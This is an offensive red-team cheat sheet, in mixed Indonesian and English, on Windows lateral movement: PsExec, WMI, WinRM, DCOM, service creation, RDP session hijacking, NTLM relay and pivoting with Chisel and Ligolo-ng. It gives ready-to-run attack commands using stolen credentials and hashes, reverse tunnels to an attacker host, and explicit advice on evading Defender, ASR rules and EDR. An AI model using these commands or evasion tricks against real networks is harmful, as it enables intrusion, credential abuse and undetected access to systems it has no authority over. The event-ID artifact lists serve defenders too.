# ad-misc-lateral — misc

# Windows Lateral Movement — Red Team Reference

## 1. PsExec (SMB + SCM + ADMIN$)

**Mechanism:** SMB to `ADMIN$` (C$ admin share), copy `PSEXESVC.exe`, start via Service Control Manager `\\target` named pipe, execution as SYSTEM.

**Prerequisites:** SMB (445) reachable, account has `SeAdminPrivilege` / local admin, `ADMIN$` share active, `LanmanServer` running, firewall allow File and Printer Sharing.

```cmd
:: Sysinternals PsExec 2.43
PsExec.exe \\10.10.10.50 -u DOMAIN\user -p P@ss -accepteula -s -d cmd.exe /c "whoami > C:\Windows\Temp\out.txt"

:: Alternatif impacket psexec.py (v0.11+)
psexec.py DOMAIN/user:P@ss@10.10.10.50 -hashes :NThash "cmd.exe /c whoami"

:: smbexec (falls back ke service binPath, no binary copy)
smbexec.py DOMAIN/user:P@ss@10.10.10.50
```

**Artifacts that appear:**
- Service `PSEXESVC` (Event 7045 System log, Event 4697 Security log)
- File `C:\Windows\PSEXESVC.exe`
- Named pipe `\\.\pipe\PSEXESVC`
- Event 4688 proses `cmd.exe` child of `PSEXESVC.exe` as SYSTEM
- Network: SMB session to `ADMIN$`

**Why it fails:**
- SMB signing required on DC (default Windows Server 2022+ / 24H2 hardening) → relay only, not auth.
- Defender ASR rule "Block process creations originating from PSExec and WMI commands" (ASR rule `d1e49aac-8f56-4280-b9ba-993a6d77406c`).
- `ADMIN$` disabled / `AutoShareWks=0`.
- UAC remote restrictions — non-RID500 local admin token filtered, need `LocalAccountTokenFilterPolicy=1`.

---

## 2. WMI (Win32_Process + DCOM)

**Mechanism:** DCOM `IWbemServices::ExecMethod` on `Win32_Process::Create` via RPC endpoint mapper (135) → dynamic port. Process runs as caller (not SYSTEM).

**Prerequisites:** 135 + dynamic RPC range, `Winmgmt` running, remote admin account (`Remote Enable` DCOM ACL), firewall allow WMI-In.

```powershell
# PowerShell native, no tool drop
$c = Get-WmiObject -Class Win32_Process -ComputerName 10.10.10.50 -Credential (Get-Credential)
$c.Create("cmd.exe /c whoami > C:\Windows\Temp\wmi.txt")

# impacket wmiexec.py v0.12 (semi-interactive, output via temp file)
wmiexec.py -hashes :NThash DOMAIN/user@10.10.10.50 "whoami"

# wmic (deprecated di Win11 24H2, dihapus dari default)
wmic /node:10.10.10.50 /user:DOMAIN\user /password:P@ss process call create "cmd.exe /c whoami"
```

**Artefak:**
- Event 4688: `WmiPrvSE.exe` → child `cmd.exe`, parent user = caller (not SYSTEM)
- Event 4624 type 3 (network logon) from attacker
- Event 4648 (explicit creds) jika `-Credential`
- Network: RPC endpoint mapper 135 → ephemeral 49152-65535
- Sysmon Event 1 + Event 11 (file output), Event 3 (network to RPC)

**Why it fails:**
- RPC dynamic port range diblokir firewall (default corporate: only 135 open).
- Defender ASR "Block process creations originating from PSExec and WMI commands" — also applies to WMI.
- `wmic.exe` removed by default in Windows 11 24H2 (feature-on-demand "WMIC").
- UAC remote filter sama seperti PsExec.
- Credential Guard disables NTLM pass-the-hash for WMI (Kerberos only).

**Variant:** `wmiexec` semi-interactive opens `\\.\pipe\__<random>` via SMB to read stdout, so it also needs 445.

---

## 3. WinRM (WSMan 5985/5986)

**Mechanism:** SOAP over HTTP(S) to WinRM listener. Auth via NTLM/Kerberos/CredSSP. Execution via remote `Win32_Process` (same as WMI, but SOAP transport).

**Prerequisites:** `WinRM` service running, listener configured (`winrm quickconfig`), user in `Remote Management Users` or admin, 5985 (HTTP) / 5986 (HTTPS) reachable, TrustedHosts or domain/Kerberos.

```powershell
# Native
$s = New-PSSession -ComputerName 10.10.10.50 -Credential (Get-Credential) -Authentication Negotiate
Invoke-Command -Session $s -ScriptBlock { whoami; hostname }

# Non-domain (workgroup) — butuh TrustedHosts
winrm set winrm/config/client '@{TrustedHosts="10.10.10.50"}'
Enter-PSSession -ComputerName 10.10.10.50 -Credential $cred -Authentication Negotiate

# evil-winrm (Ruby, v3.7)
evil-winrm -i 10.10.10.50 -u user -p P@ss
evil-winrm -i 10.10.10.50 -u user -H NThash
```

**Artefak:**
- Event 91 WinRM Operational (session created), Event 168
- Event 4624 type 3 (NTLM) or type 3 (Kerberos)
- Event 4688: `wsmprovhost.exe` → child proses
- Network: 5985/5986 TCP

**Why it fails:**
- 5985 blocked (many environments only allow 5986 with valid cert — need `-SkipCNCheck -SkipCACheck` in `New-PSSessionOption`).
- Non-domain + NTLM + TrustedHosts belum diset → `The WinRM client cannot process the request`.
- Kerberos + SPN mismatch → butuh FQDN tepat.
- `Remote Management Users` does not include user (admin via local Administrators group still ok, but UAC filter applies).

---

## 4. DCOM (Mmc20, ShellWindows, ShellBrowserWindow)

**Mechanism:** DCOM coordination via RPC to instantiate COM object on target, calling a method that runs a process (`ExecuteShellCommand`, `ShellExecute`, etc.).

**Prerequisites:** 135 + dynamic RPC, `user` in local admin (for MMC20), DCOM activation permissions (default admin ok).

```powershell
# Mmc20.Application (paling umum)
$d = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.50"))
$d.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\Windows\Temp\dcom.txt","7")

# ShellWindows via explorer.exe pada session user
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.50"))
$item = $shell.Item(); $item.Document.Application.ShellExecute("cmd.exe","/c whoami","C:\Windows\Temp","open",0)

# ShellBrowserWindow
$b = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.50"))

# impacket dcomexec.py
dcomexec.py -hashes :NThash DOMAIN/user@10.10.10.50 "whoami" -object MMC20
```

**Artefak:**
- Event 4688: child process from `mmc.exe` or `explorer.exe` (not from service) — parent process anomaly
- Event 10016 DistributedCOM (jika permission insufficient, muncul sebagai error)
- Network: RPC endpoint mapper

**Why it fails:**
- Only runs if a user is logged in (ShellWindows/ShellBrowserWindow needs explorer session).
- Defender ASR (WMI/PSExec) does not cover DCOM — but EDR behavioral rule for "parent process contradiction" usually catches it.
- Firewall RPC dynamic port.
- DCOM hardening in Windows Server 2025 / Win11 24H2 (DCOM RPC packet privacy default `RequireIntegrityActivationAuthenticationLevel=1`) blocks cross-machine DCOM from non-domain / workgroup unauthenticated.

---

## 5. SCM (Service Control Manager) — Direct

**Mechanism:** RPC `OpenSCManager` + `CreateService` + `StartService` on `\\target`. Binary must already be in a staging path readable by target (SMB share or ADMIN$).

**Prerequisites:** Admin, 135 + RPC dynamic, share readable.

```cmd
:: Native sc.exe
sc.exe \\10.10.10.50 create TestSvc binPath= "cmd.exe /c whoami > C:\Windows\Temp\sc.txt" start= demand
sc.exe \\10.10.10.50 start TestSvc
sc.exe \\10.10.10.50 delete TestSvc

:: impacket services.py
services.py DOMAIN/user:P@ss@10.10.10.50 create -name TestSvc -display TestSvc -path "cmd.exe /c whoami"
services.py DOMAIN/user:P@ss@10.10.10.50 start -name TestSvc
services.py DOMAIN/user:P@ss@10.10.10.50 delete -name TestSvc
```

**Artefak:**
- Event 7045 System (service installed) — **flagship detection**
- Event 4697 Security
- Event 7036 (state change), 7000/7009 (failure)
- Event 4688: child of `services.exe` as SYSTEM

**Why it fails:**
- Service cannot run because binary path is invalid → Event 7000.
- `CreateService` denied if not admin.
- Detection: Event 7045 is the noisiest signal — all EDRs alert on this.

---

## 6. RDP Hijack (Session Takeover)

**Direction:** Take over RDP session of a user who is already logged in (does not need that user's password).

**Prerequisites:** Access as SYSTEM on target host (or local admin for `query session`), `Tscon`/`tsadmin` accessible, target session in state `Active` or `Disc`.

```cmd
:: 1. Enumerate sessions
query user
:: atau
qwinsta

:: Contoh output:
::  admin       1  Active   8/12/2024 9:00 AM
::  victim      2  Disc     8/12/2024 9:05 AM

:: 2. Hijack dari SYNSTEM context (via PsExec -s atau service)
::    tscon <sessionID> /dest:<current console session>
::    Untuk RDP: hijack session 2 ke session RDP attacker
tscon 2 /dest:rdp-tcp#3

:: 3. Alternatif: impacket rdp_check / xfreerdp dengan stolen session? No — tscon adalah jalur asli.

:: 4. Untuk RDP tanpa interaktif, jika target SMB + service:
::    Schedule via schtasks as SYSTEM
schtasks /create /s 10.10.10.50 /ru SYSTEM /tn hijack /tr "cmd /c tscon 2 /dest:rdp-tcp#3" /sc once /st 00:00
schtasks /run /s 10.10.10.50 /tn hijack
```

**Artefak:**
- Event 4778 (session reconnected), 4779 (disconnected)
- Event 4624 type 10 (RemoteInteractive) after hijack
- Event 4688: `tscon.exe` executed (often SYSTEM)

**Why it fails:**
- `tscon` needs privilege `SeTcbPrivilege` / SYSTEM context for cross-session.
- Session not in hijackable state (already Active on another console with lock).
- Remote desktop services disabled.
- EDR alert on `tscon.exe` that is not interactive (parent is not `userinit.exe`).

**Product version:** Windows Server 2019/2022 RDP hijack via tscon still valid; Server 2025 adds audit `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` with Event 1149 (transport connect) that strengthens detection.

---

## 7. SMB Relay (NTLM Relay)

**Mechanism:** Attacker captures NTLM auth from victim (via LLMNR/mDNS poisoning, ARP spoof, or crafted link), relay to SMB target whose signing is **not required**.

**Prerequisites:**
- Target SMB signing `Not Required` / `Disabled` (Windows default client = required since 24H2, server still `Not Required` default — changes in Server 2025 / 24H2 with `SmbClientRequireSigning=1`).
- Victim performs NTLM auth to attacker.
- NTLM not blocked domain-wide (`RestrictNTLM` GPO).

```bash
# 1. Disable SMB + HTTP listener di Responder
# /etc/responder/Responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -rdwv

# 2. Relay ke SMB target (ntlmrelayx)
#    Default: dump SAM
ntlmrelayx.py -tf targets.txt -smb2support

# 3. Relay + execute command
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\Windows\Temp\relay.txt"

# 4. Relay LDAP ke DC (untuk RBCD / ACL abuse)
ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --delegate-access --escalate-user svc_low

# 5. Relay ke target dengan signing required → error, pindah target
```

**targets.txt:**
```
10.10.10.60
10.10.10.61
```

**Artefak:**
- Event 4624 type 3 on target with `Authentication Package: NTLM`, `Workstation Name: <attacker>`, anomalous source IP
- Event 4776 (credential validation) on target/DC
- On victim: Event 4648 (explicit cred), Event 4624 type 3 to attacker
- `ntlmrelayx` default: SAM dump → event 4656? Not always, but SACL `SAM` access.

**Why it fails:**
- SMB signing required: default **Windows 24H2 client requires signing**, and hardening push in enterprise (`RequireSecuritySignature`). Check first with `nmap --script smb2-security-mode -p445 <target>`.
- EPA (Extended Protection for Authentication) in LDAP/HTTPS → relay to LDAP blocked (channel binding).
- `RestrictNTLM: Incoming NTLM Traffic = Deny` in GPO.
- Responder captures auth but victim already authenticated Kerberos to the same host (NTLM fallback does not occur).
- `ntlmrelayx` defaults to relaying to SMB1 on modern targets → setting `-smb2support` is mandatory.

**Cek target signing (nmap):**
```bash
nmap -p445 --script smb2-security-mode 10.10.10.60
# Output: "Message signing enabled but not required" → relay OK
#         "Message signing enabled and required"    → skip
```

---

## 8. Pivot — Chisel

**Mechanism:** TCP tunnel via HTTP/WebSocket. Suitable for egress via 443 with TLS fronting (nginx 1.25 reverse proxy).

**Prerequisites:** Host has outbound to attacker (443), Chisel server binary on attacker (`chisel server`), chisel client on foothold.

```bash
# Server (attacker, 1.9.1)
./chisel server --port 443 --reverse --tls-key key.pem --tls-cert cert.pem

# Client (foothold, Windows or Linux)
chisel.exe client --tls attacker.com:443 R:socks
# R:socks = reverse SOCKS5 di server port 1080

# Reverse port forward (scan internal from attacker)
chisel.exe client attacker.com:443 R:3389:10.10.10.60:3389
# now attacker localhost:3389 → internal 10.10.10.60:3389

# Multiple tunnels
chisel.exe client attacker.com:443 R:socks R:8080:10.10.10.60:80 R:445:10.10.10.61:445
```

**Artefak:**
- Network: TLS to port 443 with non-CDN SNI / self-signed certificate (can be disguised with nginx 1.25 `proxy_pass` + `ssl_preread`)
- Process: `chisel.exe` in `%TEMP%`, `%APPDATA%`, or `C:\ProgramData\`
- Sysmon Event 1 (process) + Event 3 (network connect), Event 22 (DNS query to attacker domain)

**Why it fails:**
- Egress firewall HTTP-only (proxy enforcement) — chisel needs raw TCP. Wrap with chisel `--proxy` (SOCKS upstream) if available.
- TLS inspection MITM → certificate mismatch, chisel `--fingerprint` can still be set for pinning.
- AV signature on chisel binary → compile it yourself or use `garble build`.
- Windows Defender `Behavior:Win32/Chisel` heuristic — renaming the binary is not enough, obfuscation is needed.

**nginx 1.25 SNI fronting:**
```nginx
stream {
    map $ssl_preread_server_name $backend {
        cdn.example.com 127.0.0.1:8443;   # chisel
        default         127.0.0.1:443;    # real site
    }
    server {
        listen 443;
        ssl_preread on;
        proxy_pass $backend;
    }
}
```

---

## 9. Pivot — Ligolo-ng

**Mechanism:** TUN interface full L3 pivot. Client (agent) dials out to proxy; proxy gets a `ligolo` interface like a VPN. Supports multi-hop, scanner-free routing.

**Prerequisites:** Root/admin on attacker for TUN, agent binary (v0.7.x), outbound TCP to proxy port.

```bash
# Attacker: proxy
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Interactive:
#   ligolo-ng » session
#   ligolo-ng » ifconfig
#   ligolo-ng » start            # start tunnel on ligolo interface

# Foothold: agent
./agent -connect attacker.com:11601 -ignore-cert

# Add route ke subnet internal via agent
sudo ip route add 10.10.10.0/24 dev ligolo

# Port forwarding — expose internal service ke attacker localhost
# di ligolo prompt:
#   » listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
```

**Multi-hop:** from session A, run the agent on host B, connect to the proxy via a listener on A:
```
# Session 1 aktif. Di proxy:
ligolo » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# Host B jalankan: agent -connect <ip_host_A>:11601 -ignore-cert
```

**Artefak:**
- Agent process on target (default name `agent`, usually renamed)
- Sysmon Event 3: outbound to attacker:11601
- Windows: `New-NetFirewallRule` is not created, agent uses raw socket

**Why it fails:**
- Attacker does not have root → TUN fails to be created.
- Foothold only supports HTTP CONNECT proxy → agent cannot (needs raw TCP); using chisel SOCKS + `socat` does not help; alternative is gost.
- Windows Defender detects default `agent.exe`; rename + UPX actually triggers it.
- Asymmetric routing: agent does not forward packets back like SOCKS; ensure target routes back to agent (usually automatic because agent = gateway).

**vs chisel:** chisel = L4 (port-by-port), ligolo = L3 (subnet routing, more efficient scanning). Use ligolo for internal recon, chisel for simple beacon-through-proxy.

---

## 10. Field Operational Pitfalls

| Jebakan | Gejala | Mitigasi |
|---|---|---|
| **SMB signing required** (Server 2025, hardened 24H2) | ntlmrelayx: "Signing is required" → relay dies | Enumerate `smb2-security-mode` first; fallback to LDAP relay or coerce + ADCS (PetitPotam → ESC8) |
| **RPC dynamic port firewall** | WMI/DCOM/SCM connects but exec fails | Scan port range 49152-65535; fallback to SMB-based (PsExec) or WinRM |
| **UAC remote filter** (non-RID500) | Auth succeeds on SMB but `Access Denied` on remote | Requires `LocalAccountTokenFilterPolicy=1` (already set) or use RID500, or Kerberos (not NTLM) |
| **Defender ASR** `Block PSExec/WMI` | 4688 does not appear, exec silently fails | Switch to DCOM (not covered) or DropService via custom SCM (`service creation` still works) |
| **Credential Guard active** | Pass-the-hash to WinRM/WMI fails, only Kerberos | Dump plaintext (mimikatz `sekurlsa::logonpasswords` can still get non-DC NTLM hash), or coerce Kerberos ticket |
| **`TrustedHosts` not set (workgroup)** | `New-PSSession`: "WinRM client cannot process" | Set `TrustedHosts` via registry (requires admin on attacker) or use `-Authentication Negotiate` + NTLM |
| **WinRM 5986 certificate CN mismatch** | SSL error | `New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck` |
| **DCOM hardening Win11 24H2** (`RequireIntegrityActivationAuthenticationLevel=1`) | `MMC20` activation `Access Denied` cross-host | Requires RPC integrity packet (RPC_C_AUTHN_LEVEL_PKT_INTEGRITY) — native PowerShell does not support it; use `impacket dcomexec --object MMC20`, still ok because it sets integrity |
| **tscon `Access Denied`** | Cannot hijack | Requires SYSTEM (`SeTcbPrivilege`); via PsExec `-s` or service |
| **Wrong Session ID** (`rdp-tcp#N`) | `tscon: session not found` | `qwinsta` first, target must be `Active` or `Disc`; `#N` changes on every reconnect |
| **Chisel binary in AV** | Process terminates quickly | `garble` build, strip strings, run from `%APPDATA%\Roaming\Microsoft\`, not `%TEMP%` |
| **Egress HTTP proxy only** | chisel TCP out fails | Chisel `--proxy` flag or ligolo `listener_add` via a host that has raw egress |
| **TUN in container** | `ligolo` interface cannot be created | `--cap-add=NET_ADMIN` or host network |
| **ntlmrelayx default SMB1** | Target SMB2+ → "SMBSESSION setup failed" | Selalu `-smb2support` |
| **PetitPotam to patched DC** (2022+, `MS-EFSRPC` hardened) | Coerce fails 4625 logon failure | Pivot coerce target: `MS-RPRN` (PrinterBug, still valid on print server), `DFSCoerce`, `ShadowCoerce`, `MSEven` |
| **Event 7045 alert overload** | EDR blocks `CreateService` | Service name obfuscation is not enough — use `schtasks` (Event 4698) or WMI `Win32_Process` (does not create a service) |
| **`ADMIN$` disabled** (`AutoShareWks=0`) | PsExec: "network path not found" | Use explicit `C$` or staging via SMB CreateFile to a writable path then SCM with `binPath` UNC |
| **Firewall blocks 135 but 445 open** | WMI/DCOM/SCM fails, SMB ok | Fallback PsExec / smbexec / atexec (schtasks via SMB) / `smbclient` + `smbmap` for staging, execution via scheduled task |
| **EDR cloud + Sysmon Event 1 parent anomaly** | DCOM (`mmc.exe` → `cmd.exe`) flag | Parent-process spoofing or use a LOLBin that is indeed an expected child (example: `rundll32`, `mshta`) |
| **Session 0 isolation** | DCOM ShellWindows fails on a server without an interactive user | Use MMC20 or fallback to SCM |
| **Kerberos-only LDAP** (LDAP signing + channel binding) | ntlmrelayx LDAP → "invalidCredentials" | Relay to ADCS Web Enrollment (ESC8, `http://ca/certsrv`) — channel binding check in IIS is often lax |

---

## [reasoning trace]


